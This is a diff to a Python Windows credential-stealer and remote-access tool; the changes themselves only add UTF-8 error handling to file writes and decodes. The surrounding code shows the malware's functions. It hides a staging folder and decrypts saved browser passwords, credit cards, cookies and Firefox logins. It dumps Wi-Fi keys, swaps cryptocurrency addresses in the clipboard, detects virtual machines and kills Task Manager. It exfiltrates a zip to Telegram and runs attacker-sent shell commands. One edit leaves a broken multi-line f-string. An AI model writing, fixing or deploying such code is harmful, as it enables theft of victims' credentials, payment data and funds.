@@ -60,7 +60,7 @@ def mark_exfiltrated():
 def profile_system():
     os.makedirs(EXTRACT_FOLDER, exist_ok=True)
     subprocess.call(f'attrib +h "{EXTRACT_FOLDER}"', shell=True)  # Make folder hidden
-    with open(os.path.join(EXTRACT_FOLDER, "system_info.txt"), "w") as f:
+    with open(os.path.join(EXTRACT_FOLDER, "system_info.txt"), "w", encoding="utf-8", errors="ignore") as f:
         f.write(f"OS: {platform.system()} {platform.version()}\n")
         f.write(f"Machine: {platform.machine()}\n")
         f.write(f"Processor: {platform.processor()}\n")
@@ -90,7 +90,7 @@ def take_screenshot():
         img = ImageGrab.grab()
         img.save(os.path.join(EXTRACT_FOLDER, "screenshot.png"))
     except Exception as e:
-        with open(os.path.join(EXTRACT_FOLDER, "screenshot_error.txt"), "w") as f:
+        with open(os.path.join(EXTRACT_FOLDER, "screenshot_error.txt"), "w", encoding="utf-8", errors="ignore") as f:
             f.write(f"[!] Screenshot failed during run(): {e}")
 
 
@@ -107,14 +107,14 @@ def check_webcam():
 def extract_wifi():
     output = os.path.join(EXTRACT_FOLDER, "wifi.txt")
     try:
-        result = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
+        result = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8", errors="ignore")
         ssids = re.findall(r"All User Profile\s*:\s(.*)", result)
         with open(output, "w") as f:
             for ssid in ssids:
                 ssid = ssid.strip()
                 f.write(f"SSID: {ssid}\n")
                 try:
-                    details = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', shell=True).decode()
+                    details = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', shell=True).decode("utf-8", errors="ignore")
                     pwd = re.search(r"Key Content\s*:\s(.*)", details)
                     f.write(f"Password: {pwd.group(1) if pwd else 'N/A'}\n\n")
                 except:
@@ -128,7 +128,7 @@ def detect_vm():
     sysinfo = subprocess.getoutput("SYSTEMINFO")
     for i in indicators:
         if i.lower() in sysinfo.lower():
-            with open(os.path.join(EXTRACT_FOLDER, "vm_detected.txt"), "w") as f:
+            with open(os.path.join(EXTRACT_FOLDER, "vm_detected.txt"), "w", encoding="utf-8", errors="ignore") as f:
                 f.write(f"VM Detected: {i}\n")
 
 def kill_taskmgr_once():
@@ -156,7 +156,7 @@ BROWSERS = {
 
 def get_key(path):
     try:
-        with open(os.path.join(path, "Local State"), "r") as f:
+        with open(os.path.join(path, "Local State"), "r", encoding="utf-8", errors="ignore") as f:
             key = base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:]
         return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
     except:
@@ -166,9 +166,11 @@ def decrypt(buff, key):
     try:
         if buff.startswith(b'v10') or buff.startswith(b'v11'):
             iv, payload = buff[3:15], buff[15:]
-            return AES.new(key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode()
+            return AES.new(key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode("utf-8", errors="ignore")
+
         else:
-            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
+            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode("utf-8", errors="ignore")
+
     except:
         return "FAILED"
 
@@ -189,7 +191,7 @@ def steal_browser():
                 c = sqlite3.connect("tmp_pwd.db").cursor()
                 try:
                     c.execute("SELECT origin_url, username_value, password_value FROM logins")
-                    with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8") as f:
+                    with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8", errors="ignore") as f:
                         for row in c.fetchall():
                             f.write(f"[{name}] {row[0]} | {row[1]} | {decrypt(row[2], key)}\n")
                 except: pass
@@ -205,7 +207,7 @@ def steal_browser():
                     cursor = conn.cursor()
                     cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                     rows = cursor.fetchall()
-                    with open(os.path.join(EXTRACT_FOLDER, "cards.txt"), "a", encoding="utf-8") as f:
+                    with open(os.path.join(EXTRACT_FOLDER, "cards.txt"), "a", encoding="utf-8", errors="ignore") as f:
                         for name_on_card, mm, yy, enc in rows:
                             card_number = decrypt(enc, key)
                             f.write(f"[{name}] {name_on_card} | {mm}/{yy} | {card_number}\n")
@@ -221,7 +223,7 @@ def steal_browser():
                     conn = sqlite3.connect("tmp_cookie.db")
                     cursor = conn.cursor()
                     cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
-                    with open(os.path.join(EXTRACT_FOLDER, "cookies.txt"), "a", encoding="utf-8") as f:
+                    with open(os.path.join(EXTRACT_FOLDER, "cookies.txt"), "a", encoding="utf-8", errors="ignore") as f:
                         for host, name_, enc_val in cursor.fetchall():
                             decrypted = decrypt(enc_val, key)
                             f.write(f"[{name}] {host} | {name_} = {decrypted}\n")
@@ -272,15 +274,16 @@ def steal_firefox_passwords():
                 input_item = SECItem(0, ctypes.cast(ctypes.create_string_buffer(data), ctypes.c_void_p), len(data))
                 output_item = SECItem()
                 if nss.PK11SDR_Decrypt(byref(input_item), byref(output_item), None) == 0:
-                    result = ctypes.string_at(output_item.data, output_item.len).decode()
+                    result = ctypes.string_at(output_item.data, output_item.len).decode("utf-8", errors="ignore")
+
                     return result
                 return "[DECRYPT FAIL]"
 
-            with open(logins_path, "r", encoding="utf-8") as f:
+            with open(logins_path, "r", encoding="utf-8", errors="ignore") as f:
                 logins = json.load(f).get("logins", [])
 
             os.makedirs(EXTRACT_FOLDER, exist_ok=True)
-            with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8") as out:
+            with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8", errors="ignore") as out:
                 for login in logins:
                     try:
                         url = login.get("hostname")
@@ -330,13 +333,13 @@ def clipper():
                 win32clipboard.EmptyClipboard()
                 win32clipboard.SetClipboardText(CLIP_WALLETS[coin])
                 win32clipboard.CloseClipboard()
-                with open(os.path.join(EXTRACT_FOLDER, "clipper_log.txt"), "a") as f:
+                with open(os.path.join(EXTRACT_FOLDER, "clipper_log.txt"), "a", encoding="utf-8", errors="ignore") as f:
                     f.write(f"[{datetime.datetime.now()}] Replaced {coin} clipboard: {data.strip()} → {CLIP_WALLETS[coin]}\n")
                 break
 
     except Exception as e:
         try:
-            with open(os.path.join(EXTRACT_FOLDER, "clipper_error.txt"), "a") as err:
+            with open(os.path.join(EXTRACT_FOLDER, "clipper_error.txt"), "a", encoding="utf-8", errors="ignore") as err:
                 err.write(f"[{datetime.datetime.now()}] Clipper error: {str(e)}\n")
         except:
             pass
@@ -380,7 +383,7 @@ def send_zip_to_telegram():
         os.remove(zip_path)
 
     except Exception as e:
-        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w") as errlog:
+        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w", encoding="utf-8", errors="ignore") as errlog:
             errlog.write(str(e))
 
 
@@ -562,7 +565,7 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                             img.save(ss_path)
                         except Exception as e:
                             error_msg = f"[!] Screenshot failed: {e}"
-                            with open(os.path.join(EXTRACT_FOLDER, "screenshot_error.txt"), "w") as f:
+                            with open(os.path.join(EXTRACT_FOLDER, "screenshot_error.txt"), "w", encoding="utf-8", errors="ignore") as f:
                                 f.write(error_msg)
                             send_data(error_msg)
                             continue  # Skip sending file
@@ -626,7 +629,8 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                         s.send(output)
                     except subprocess.CalledProcessError as e:
-                        send_data(f"[!] Error: {e.output.decode()}")
+                        send_data(f"[!] Error: {e.output.decode("utf-8", errors="ignore")
+}")
             s.close()
         except:
             time.sleep(30)
@@ -664,7 +668,7 @@ def run():
                 profile_system()
                 take_screenshot()
                 if check_webcam():
-                    with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
+                    with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w", encoding="utf-8", errors="ignore") as f:
                         f.write("Webcam detected.")
                 extract_wifi()
                 detect_vm()
@@ -675,7 +679,7 @@ def run():
                 send_zip_to_telegram()
                 mark_exfiltrated()
         except Exception as e:
-            with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a") as log:
+            with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a", encoding="utf-8", errors="ignore") as log:
                 log.write(f"profile/exfil phase failed: {e}\n")
 
         fake_input()
@@ -684,7 +688,7 @@ def run():
             time.sleep(10)
 
     except Exception as e:
-        with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a") as log:
+        with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a", encoding="utf-8", errors="ignore") as log:
             log.write(f"run() fatal error: {e}\n")
 
         # fall into infinite loop anyway
@@ -696,6 +700,7 @@ def run():
 
 if __name__ == "__main__":
     run()
+
 
 
 
